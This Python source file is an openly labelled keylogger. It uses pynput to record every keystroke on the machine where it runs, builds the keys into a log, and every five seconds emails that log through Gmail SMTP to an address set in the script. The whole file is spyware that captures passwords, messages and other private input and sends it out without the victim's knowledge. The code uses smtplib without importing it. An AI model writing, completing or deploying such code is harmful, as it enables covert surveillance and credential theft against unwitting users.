#!/usr/bin/env python

import pynput.keyboard as pk
import threading


class Keylogger:
    def __init__(self,time_interval,uname,passwd, email):
        # Initialize required variables
        self.log=""
        self.interval=time_interval
        self.username=uname
        self.password=passwd
        self.email = email


    def send_mail_report(self, data):
        # Sends the mail with log of the keys pressed to specified account
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.username, self.password)
        server.sendmail(self.email, self.email, data)
        server.quit()


    def append_to_log(self,string):
        # Forms a Sting of keystrikes pressed
        self.log=self.log+string

    def process_key_press(self,key):
        # Recognises what key is pressed and how to deal with it
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key=" "
            else:
                current_key=" "+str(key)+" "
        self.append_to_log(current_key)

    def report(self):
        # Reports the keystikes collected after certian time
        # print(self.log)
        self.send_mail_report(self.log)
        self.log=""

        timer=threading.Timer(self.interval,self.report)
        timer.start()


    def start(self):
        # Creates an object and calls a method everytime a key is pressed
        keyboard_listener = pk.Listener(on_press=self.process_key_press)
        with keyboard_listener:                                                             # with keyword in python is used to interact with streams of data
            self.report()
            keyboard_listener.join()


# main code
username = ""                             # email to be send
password = ""                             # and its password
mail = ""                                 # email where logged  information is to be send                    
my_keylogger = Keylogger(time_interval=5, uname=username, passwd=password, email=mail)
my_keylogger.start()